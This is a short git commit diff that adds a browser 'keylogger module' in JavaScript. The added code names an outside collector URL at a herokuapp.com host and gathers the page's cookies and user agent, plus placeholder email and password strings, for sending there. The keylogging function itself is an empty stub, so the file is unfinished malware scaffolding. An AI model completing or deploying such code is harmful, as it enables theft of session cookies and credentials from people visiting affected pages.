0d6ad63b892868d5923054ae278de5a9327a1c5b
Fabio Castro <fabiocastro@riseup.net>
2017-10-16 14:01:46 -0200

    Adding the keylogger module

--- modules/keylogger/keylogger.js
+++ modules/keylogger/keylogger.js
@@ -1,1 +1,24 @@
-// Intercepts all requirements
+(function(){
+  
+	'use strict'
+
+	var config = config || {
+		connection: "https://evil-your.herokuapp.com/collector?",
+		timeout: 1000,
+	};
+	
+	var keys = {	
+		email: "example@gmail.com",
+		password: "#x73fz!!", 
+		cookie: document.cookie,
+		useragent: navigator.userAgent
+		
+	};
+	
+	function Keylogger () {
+      // Keylogger Function
+  }
+  
+  var keylogger = new Keylogger();
+
+})();
